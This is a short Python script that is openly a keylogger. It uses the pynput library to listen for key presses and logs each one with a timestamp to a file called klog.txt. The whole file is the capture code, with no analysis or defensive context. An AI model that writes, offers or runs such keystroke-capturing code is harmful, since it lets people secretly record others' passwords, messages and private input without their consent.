from pynput import keyboard
import logging

logging.basicConfig(filename=('klog.txt'), level=logging.DEBUG, format='%(asctime)s:%(message)s:')

def on_press(key): #captures the keystrokes and output them to the klog.txt 
    logging.info(str(key)) 

listener = keyboard.Listener(on_press=on_press)
listener.start()